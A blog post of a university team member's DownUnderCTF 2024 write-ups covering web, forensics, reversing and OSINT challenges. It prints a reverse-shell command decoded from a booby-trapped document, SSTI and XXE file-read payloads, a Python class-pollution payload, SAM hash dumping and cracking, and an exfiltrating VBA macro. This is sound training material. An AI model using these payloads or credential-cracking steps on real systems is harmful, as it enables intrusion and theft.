---
layout: post
title: DownUnderCTF 2024 - Challenge Writeups
categories: [CTF Jeopardy]
tags: [ctf jeopardy,forens,osint,web]
permalink: /posts/downunderctf2024
img_path: /images/ctfs/downunderctf2024
image:
  path: icon.png
---

I participated in the DownUnderCTF 2024 with my university team [MQCybersec](https://mqcybersec.org/), and placed **29th** out of the Australian teams. This is the solutions to the challenges I solved or contributed to solving.

![certificate](cert.jpg)

## beginner

### tldr please summarise
> I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?

We are given a `EmuWar.docx` that is mostly nothing.

![emuwardoc](emuwardoc.png)

I know that Office documents are just essentially zip archives, so I extract the contents:
```bash
$ 7z x EmuWar.docx
Scanning the drive for archives:
1 file, 8202 bytes (9 KiB)

Extracting archive: EmuWar.docx
--
Path = EmuWar.docx
Type = zip
Physical Size = 8202

Everything is Ok

Files: 9
Size:       26291
Compressed: 8202
```

Inside the `word/document.xml` I find a suspicious link:
```
... <w:t xml:space="preserve">; curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d &gt; </w:t></w:r><w:r><w:rPr> ...
```

Visiting the [Pastebin URL](https://pastebin.com/raw/ysYcKmbu) is a base64 string: `YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=`.

Decoded is the following: `bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1`.

Flag: <mark>DUCTF{chatgpt_I_n33d_2_3scap3}</mark>

### parrot the emu
> It is so nice to hear Parrot the Emu talk back

We are given web source and an instance. The website reflects what you type:

![parrottheemu](parrottheemu.png)

Looking in the source code is something of interest:
```python
...
    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)
...
```

`render_template_string` is generally dangerous with unvalidated user input as its vulnerable to SSTI, as this is Python, Jinja2 SSTI is quite a good start.

I first tried the payload `{%raw%}{{7*7}}{%endraw%}` and the parrot responds with `49`, perfect!

Now we need to try read the `flag` file, I try various payload but find this one works: `{%raw%}{{ get_flashed_messages.__globals__.__builtins__.open("./flag").read() }}{%endraw%}`.

![parrottheemusolve](parrottheemu-solve.png)

Flag: <mark>DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}</mark>

### Sun Zi's Perfect Math Class
> Everybody!! Sunzi's math class is about to begin!!!

This challenge involves the Chinese Remainder Theorem, and with some help with my teammate we solved this one. I'm not particularly well experienced with any form of cryptography so I was easily intimidated.

The first portion is the following:
> In 200 BC, the Chinese general Han Xin marched into battle with 1500 soldiers. Afterwards, he could estimate that between 1000 and 1100 of them survived the battle, but needed to know exactly how many men he had.
> At that moment, Han Xin's steward came up to his side and said:
> When the soldiers stand 3 in a row, there are 2 soldiers left over. When they line up 5 in a row, there are 4 soldiers left over. When they line up 7 in a row, there are 5 soldiers left over.
> Upon hearing this, Han Xin knew immediately how many soldiers he had remaining.

My teammate created some Java code to find the number at the time:
```java
public class Main {
    public static int gimmeHowMany() {
        for (int i = 1000; i <= 1100; i++) {
            if (i % 3 == 2 && i % 5 == 4 && i % 7 == 5) {
                return i;
            }
        }
        return 0;
    }

    public static void main(String[] args) {
        int result = gimmeHowMany();
        if (result != 0) {
            System.out.println("The number is: " + result);
        } else {
            System.out.println("No number found that satisfies the conditions.");
        }
    }
}
```

Here is a quick Python script I wrote to do the same:
```python      
for i in range(1000,1101):
  if (i%3==2 and i%5==4 and i%7==5):
    print(i)
```

The result for the first section was: `1034`.

The second section caused more issues that the first.

> The technique Han Xin used is known to us today as the Chinese Remainder Theorem. In the language of modern algebra, we can write the problem as the system of equations.

> $ x \equiv 2 \pmod{3} $

> $ x \equiv 4 \pmod{5} $

> $ x \equiv 5 \pmod{7} $

> The notation $ x \equiv y \pmod{n} $ means "the remainder of $ x $ divided by $ n $ is equal to $ y $".
> This idea of working with "remainders after division" underpins many of our building blocks for modern cryptography. One of these building blocks is the RSA cryptosystem. Broadly speaking, the RSA cryptosystem takes a secret number $ m $ and turns it into an encrypted number $ c $ by calculating the value

> $ c \equiv m^e \pmod{n}. $

> Given only the values of $ e $, $ c $ and $ n $, it should be impossible for an attacker to recover the secret message. However something strange happens when $ e $ is small and the same message is sent multiple times using different $ n $. Can you recover the hidden message from the three transmissions below?

> $ c_1 \equiv m^e \pmod{n_1} $

> $ c_2 \equiv m^e \pmod{n_2} $

> $ c_3 \equiv m^e \pmod{n_3} $

> where

```
e = 3

c_1 = 105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637

c_2 = 31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737

c_3 = 64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659

n_1 = 147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693

n_2 = 95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403

n_3 = 95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817
```

Now, we need to find $ m $, which is the hidden message. Due to the small public expontent $ e $ we can crack the message, also utilising CRT:

```python
from sympy.ntheory.modular import crt
from gmpy2 import iroot

def find_m(c1, c2, c3, n1, n2, n3, e):
    # crt
    x, N = crt([n1, n2, n3], [c1, c2, c3])

    m, exact = iroot(x, e)
    
    if exact:
        return int(m)
    else:
        return None

e = 3
c1 = 105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637
c2 = 31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737
c3 = 64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659
n1 = 147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693
n2 = 95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403
n3 = 95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817

print(find_m(c1, c2, c3, n1, n2, n3, e))
```

This returns: `11564025922867522871782912815123211630478650327759091593792994457296772521676766420142199669845768991886967888274582504750347133`.

Flag: <mark>DUCTF{btw_y0u_c4n_als0_us3_CRT_f0r_p4rt14l_fr4ct10ns}</mark>

### zoo feedback form
> The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

We are given both a web source code zip and an instance.

![zoofeedbackform](zoofeedbackform.png)

It reflects what we type, lets see whats going on in the request when I press `Submit Feedback`.

```xml
<?xml version="1.0" encoding="UTF-8"?>
            <root>
                <feedback>hi!!</feedback>
            </root>
```

Hm, XML has some common attacks such as [XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity). I look at the source code and see we need to read a `./flag.txt`.

Looking at the XXE example payloads I craft a file read payload like this:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "./flag.txt"> ]>
            <root>
                <feedback>&example;</feedback>
            </root>
```

Let's try it!

`Feedback sent to the Emus: DUCTF{emU_say$_he!!0_h0!@_ci@0}`

Flag: <mark>DUCTF{emU_say$_he!!0_h0!@_ci@0}</mark>

### number mashing
> Mash your keyboard numpad in a specific order and a flag might just pop out!

This is a reverse engineering challenge in which we are given an ELF binary.

I open the binary with Ghidra and disassemble it to look at the pseudocode.

```c

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 main(void)

{
  int local_11c;
  int local_118;
  int local_114;
  FILE *local_110;
  undefined8 local_108;
  undefined8 uStack_100;
  undefined8 local_f8;
  undefined8 uStack_f0;
  undefined8 uStack_e8;
  undefined8 uStack_e0;
  undefined8 local_d8;
  undefined8 uStack_d0;
  undefined8 uStack_c8;
  undefined8 uStack_c0;
  undefined8 local_b8;
  undefined8 uStack_b0;
  undefined8 uStack_a8;
  undefined8 uStack_a0;
  undefined8 local_98;
  undefined8 uStack_90;
  undefined8 uStack_88;
  undefined8 uStack_80;
  undefined8 local_78;
  undefined8 uStack_70;
  undefined8 uStack_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 uStack_50;
  undefined8 uStack_48;
  undefined8 uStack_40;
  undefined8 local_38;
  undefined8 uStack_30;
  undefined8 uStack_28;
  undefined8 uStack_20;
  undefined8 local_18;
  undefined8 uStack_10;
  long local_8;
  
  local_8 = ___stack_chk_guard;
  setvbuf(_stdout,(char *)0x0,2,0);
  setvbuf(_stdin,(char *)0x0,2,0);
  printf("Give me some numbers: ");
  __isoc99_scanf("%d %d",&local_11c,&local_118);
  if (((local_11c == 0) || (local_118 == 0)) || (local_118 == 1)) {
    puts("Nope!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_114 = 0;
  if (local_118 != 0) {
    local_114 = local_11c / local_118;
  }
  if (local_114 != local_11c) {
    puts("Nope!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_108 = 0;
  uStack_100 = 0;
  uStack_f0 = 0;
  local_f8 = 0;
  uStack_e0 = 0;
  uStack_e8 = 0;
  uStack_d0 = 0;
  local_d8 = 0;
  uStack_c0 = 0;
  uStack_c8 = 0;
  uStack_b0 = 0;
  local_b8 = 0;
  uStack_a0 = 0;
  uStack_a8 = 0;
  uStack_90 = 0;
  local_98 = 0;
  uStack_80 = 0;
  uStack_88 = 0;
  uStack_70 = 0;
  local_78 = 0;
  uStack_60 = 0;
  uStack_68 = 0;
  uStack_50 = 0;
  local_58 = 0;
  uStack_40 = 0;
  uStack_48 = 0;
  uStack_30 = 0;
  local_38 = 0;
  uStack_20 = 0;
  uStack_28 = 0;
  uStack_10 = 0;
  local_18 = 0;
  local_110 = fopen("flag.txt","r");
  fread(&local_108,1,0x100,local_110);
  printf("Correct! %s\n",(char *)&local_108);
  if (local_8 - ___stack_chk_guard != 0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(&__stack_chk_guard,0,0,local_8 - ___stack_chk_guard);
  }
  return 0;
}
```

I ask some AI to simplify this C code:
```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    int num1, num2, result;
    FILE *file;
    char flag[256];

    // Set buffer modes for stdout and stdin
    setvbuf(stdout, NULL, _IOLBF, 0);
    setvbuf(stdin, NULL, _IOLBF, 0);

    // Prompt user for input
    printf("Give me some numbers: ");
    if (scanf("%d %d", &num1, &num2) != 2) {
        puts("Invalid input!");
        exit(1);
    }

    // Perform checks on the input numbers
    if (num1 == 0 || num2 == 0 || num2 == 1) {
        puts("Nope!");
        exit(1);
    }

    result = num1 / num2;
    if (result != num1) {
        puts("Nope!");
        exit(1);
    }

    // Open the flag file and read its content
    file = fopen("flag.txt", "r");
    if (file == NULL) {
        perror("Error opening file");
        exit(1);
    }

    if (fread(flag, 1, sizeof(flag) - 1, file) <= 0) {
        perror("Error reading file");
        fclose(file);
        exit(1);
    }
    fclose(file);

    // Null-terminate the flag string
    flag[sizeof(flag) - 1] = '\0';

    // Print the flag
    printf("Correct! %s\n", flag);

    return 0;
}
```

The checks are as follows:
- Must provide 2 numbers.
- The first number cannot be 0.
- The second number cannot be 0 or 1.
- The first number divided by the second must equal the first number.

This never checks for negative numbers! So we have access to `-1` but thats no use as if we did `10 -1` for example, `result` would be `-10` and `num1` is still `10`...

Could we use integer overflows? So if we used the 32 bit integer limit: `2147483648` and `-1` we'd get `0` as `num1` as it overflows, and then `0` as it becomes `-2147483648` which again underflows to `0`, so passing the requirements and getting the flag.

```
$ nc 2024.ductf.dev xxxxx
Give me some numbers: 2147483648 -1
Correct! DUCTF{w0w_y0u_just_br0ke_math!!}
```

This also works with `-2147483648 -1` as the `result` then overflows and the `num1` underflows.

Flag: <mark>DUCTF{w0w_y0u_just_br0ke_math!!}</mark>

## web

### co2
> A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

We are given the source code which is in Python. The website has a few functions involving account registration, profile viewing, blog posts and a dashboard. But one particular function is of interst, the feedback section.

The `/get_flag` endpoint checks a `flag` env variable to get the flag:
```python
@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

Looking at the `/save_feedback` endpoints function we can see this:
```python
@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200


...


def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def save_feedback_to_disk(feedback_obj):
    feedback = ""
    for attr in dir(feedback_obj):
        if not attr.startswith('__') and not callable(getattr(feedback_obj, attr)):
            feedback += f"{attr}: {getattr(feedback_obj, attr)}\n"
    feedback_dir = 'feedback'
    if not os.path.exists(feedback_dir):
        os.makedirs(feedback_dir)
        print(f"Directory {feedback_dir} created.")
    else:
        print(f"Directory {feedback_dir} already exists.")
    files = glob.glob(os.path.join(feedback_dir, '*'))
    if len(files) >= 5:
        oldest_file = min(files, key=os.path.getctime)
        os.remove(oldest_file)
        print(f"Deleted oldest file: {oldest_file}")
    new_file_name = os.path.join(feedback_dir, f"feedback_{int(time.time())}.txt")
    with open(new_file_name, 'w') as file:
        file.write(feedback)
    print(f"Saved feedback to {new_file_name}")
    return True
```

Reading up on how the merge works, it turns out Python can have Prototype Pollution (I had my suspects from the challenge name also, good hint lads).

I find a [HackTricks Page](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution) on the topic (and learn about its absurdity...)

![pythonproto](pythonprotomeme.png)

> Credits to [abdulrah33m](https://blog.abdulrah33m.com/prototype-pollution-in-python/) for this excellent image

Reading the "Polluting other glasses and global vars through `globals`" section gives us a good idea of a payload:
```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```

The normal post request looks like this:
```json
{"title":"title","content":"content","rating":"10","referred":"a"}
```

I then develop our own payload from how the normal post request looks.
```json
{"title":"title","content":"content","rating":"10","referred":"a","__class__": {"__init__":{"__globals__":{"flag":"true"}}}}
```

`/get_flag` now returns the flag, as we have modified the `flag` value to be true.

Flag: <mark>DUCTF{_cl455_p0lluti0n_ftw_}</mark>

## forensics

### Baby's First Forensics
> They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version? NOTE: Wrap your answer in the `DUCTF{}`, e.g. `DUCTF{nmap_7.25}`

We are given a `.pcap` I open in Wireshark and get to work, I see HTTP traffic so start by filtering by `http` and following the HTTP stream.

We can see in the User Agent of the HTTP stream this: `Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:getinfo)`

Flag: <mark>DUCTF{Nikto_2.1.6}</mark>

### SAM I AM
> The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files. Can you reproduce how they got the Administrator's Password with the artifacts provided? Place the Administrator Account's Password in `DUCTF{}`, e.g. `DUCTF{password123!}`

We are given a `sam.bak` and a `system.bak` which are backups of the registry hives, we can use Impackets `secretsdump.py` to extract the passwords.

```bash
$ python3 /usr/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xa88f47504785ba029e8fa532c4c9e27b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:476b4dddbbffde29e739b618580adb1e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

We can then use the output of `Administrator` as a hash for `hashcat`:
```bash
$ hashcat -a 0 -m 1000 admin-hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
...
476b4dddbbffde29e739b618580adb1e:!checkerboard1
```

The password is `!checkerboard1`!

Flag: <mark>DUCTF{!checkerboard1}</mark>

### Bad Policies
> Looks like the attacker managed to access the rebels Domain Controller. Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?

We are given a folder of artifacts which look likes policies and various other configuration files from a DC.

The one that catches my eye is the `Groups.xml`. I see a `cpassword` value and look it up. I find an article from [InfoSecWriteups](https://infosecwriteups.com/attacking-gpp-group-policy-preferences-credentials-active-directory-pentesting-16d9a65fa01a) that mentions the utility `gpp-decrypt` to decrypt the hash.

```bash
$ gpp-decrypt "B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2"
DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}
```

Flag: <mark>DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}</mark>

### Macro Magic
> We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag! Note: You do not need to run or enable the macro so solve.

We are given a `Monke.xlsm` and `Capture.pcapng`. The hint of 'Macro' guides me to look into any Macros in the `Monke.xlsm`. I utilise the `oletools` tool, `olevba` to extract the macro:
```bash
$ olevba Monke.xlsm      
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: Monke.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
...
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|MSXML2.ServerXMLHTTP|May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://play.duc.tf/|URL                                          |
|IOC       |http://flag.com/    |URL                                          |
|IOC       |http://play.duc.tf/ |URL                                          |
|IOC       |http://en.wikipedia.|URL                                          |
|          |org/wiki/Emu_War    |                                             |
|IOC       |http://downunderctf.|URL                                          |
|          |com/                |                                             |
+----------+--------------------+---------------------------------------------+
```

Now I got the `Module1` macro but its full of useless comments, removing those we get this:
```vb
Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function
Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function
Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function
Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    
End Sub
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function
Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function
Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function
Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```

We can see that `superThing()` sends a web request, so there are a few web requests in order.
- http://play.duc.tf/ + `totalyFine(forensics("Yes"))`
- http://flag.com/
- http://play.duc.tf/
- http://en.wikipedia.org/wiki/Emu_War
- http://downunderctf.com/ + `totalyFine(forensics("Try Harder"))`
- http://play.duc.tf/ + `totalyFine(forensics("Pterodactyl"))`
- http://downunderctf.com/ + `totalyFine(forensics(doThing("Flag: " & valueA1, "MonkeyMagic")))`
- http://play.duc.tf/ + `totalyFine(forensics("Forensics"))`

Let's figure out what `doThing` does.

```vb
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function
```

It takes in `B` and `C` as inputs, then defines `I` as a Long and `A` as a String. For the length of `B` we append the following to `A` each time:
- Get the ASCII character of index `I` in `B`.
- Get the ASCII character of index `(I-1) % Len(C) + 1` in `C`.
- XOR the fist ASCII character by the second.
- `Chr` converts the result back to a character.
- return `A`.

OK! Let's figure out `forensics()`.

```vb
Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```

It takes in `B` as input and defines an `A()`, `I` and `C`.
- set `A` to `B` converted from Unicode to systems default character set.
- iterate through `A` and append the string representation of each character of `A` to `C`, adds a space after each character also.
- removes any trailing of leading spaces from `C`.
- return `C`.

Finally, `totalyFine()`.

```vb
Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function
```

Replaces all spaces with `-`'s, thats it.

Now looking at the `Capture.pcapng` I take out the suspicious request which involves the flag: `11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19`.

I start working backwards from the output in Python.

```python
from itertools import cycle

def xor_strings(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, cycle(s2)))

def decode_ascii(ascii_string):
    return ''.join(chr(int(code)) for code in ascii_string.split('-'))

W = "MonkeyMagic"
encoded_flag = "11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19"
decoded_ascii = decode_ascii(encoded_flag)
flag = xor_strings(decoded_ascii, W)

print("Decoded Flag:", flag)
```

This prints the flag: `Decoded Flag: Flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}`.

Flag: <mark>DUCTF{M4d3_W1th_AI_by_M0nk3ys}</mark>

## osint

### offtheramp
> That looks like a pretty cool place to escape by boat, EXAMINE the image and discover the name of this structure. NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g `DUCTF{name_of_structure}`

We are given a `offtheramp.jpeg`.

![offtheramp.jpeg](offtheramp.jpeg)

When we use `exiftool` with this image, we are given some coordinate headers:
```yml
GPS Altitude                    : 35 m Above Sea Level
GPS Latitude                    : 38 deg 9' 15.95" S
GPS Longitude                   : 145 deg 6' 29.69" E
GPS Position                    : 38 deg 9' 15.95" S, 145 deg 6' 29.69" E
```

When we put this into [Google Maps](https://www.google.com.au/maps/place/38%C2%B009'16.0%22S+145%C2%B006'29.7%22E). The ramp ahead is called `Olivers Hill Boat Ramp`.

![gmapsofftheramp](gmapsofftheramp.png)

Flag: <mark>DUCTF{olivers_hill_boat_ramp}</mark>

### cityviews
> After having to go on the run, I've had to bunker down. Which building did I capture this picture from? NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g `DUCTF{building_name}`

We are supplied a `cityviews.jpeg`.

![cityviews.jpeg](cityviews.jpeg)

I spot its in Melbourne from the `3AW Melbourne` sign in the background.

![3awcityview.png](3awcityviews.png)

My friend ends up finding the logo at the bottom of the screen is the Great Southern Melbourne Hotel.

![gsmh.jpg](gsmh.png)

